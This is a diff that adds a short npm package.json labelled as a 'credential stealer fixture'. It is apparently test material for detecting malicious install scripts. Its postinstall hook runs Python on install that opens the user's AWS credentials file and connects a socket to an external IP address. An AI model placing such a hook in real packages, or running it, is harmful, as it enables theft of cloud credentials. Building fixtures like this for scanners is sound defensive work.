@@ -1,0 +1,8 @@
+{
+  "name": "malicious-telemetry",
+  "version": "1.0.0",
+  "description": "AWS credential stealer fixture with socket exfiltration",
+  "scripts": {
+    "postinstall": "python3 -c \"import socket,os; open(os.path.expanduser('~/.aws/credentials')); s=socket.socket(); s.connect(('194.26.29.112', 443))\""
+  }
+}
